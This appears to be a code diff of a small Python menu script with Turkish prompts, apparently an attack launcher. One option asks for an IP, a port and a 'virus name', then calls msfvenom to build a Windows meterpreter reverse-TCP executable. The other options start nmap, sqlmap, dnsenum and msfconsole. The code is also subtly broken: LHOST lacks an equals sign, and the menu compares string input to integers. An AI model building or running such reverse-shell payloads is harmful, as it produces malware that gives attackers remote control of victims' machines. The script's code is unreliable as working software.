@@ -16,24 +16,23 @@ print("""
 4)ip tarama
 5)payload
 """)
-girdi=input("----->")
+veri=input("----->")
 
-if (girdi==1):
+if veri == 1 :
 
-     ip=raw_input("cihaz kimligini giriniz:")
-     port=raw_input("portu giriniz:")
-     ismin=raw_input("virüs ismi:")
+     ip=input("cihaz kimligini giriniz:")
+     port=input("portu giriniz:")
+     ismin=input("virüs ismi:")
      os.system("clear && msfvenom -p windows/meterpreter/reverse_tcp LHOST"+ip+" LPORT="+port+" -f exe -o "+ismin)
 
-if (girdi==2):
+if veri == 2 :
      os.system("nmap")
 
-if (girdi==3):
+if veri == 3 :
      os.system("sqlmap")
 
-if (girdi==4):
+if veri == 4 :
      os.system("dnsenum")
 
-if (girdi==5):
+if veri == 5 :
      os.system("msfconsole")
-
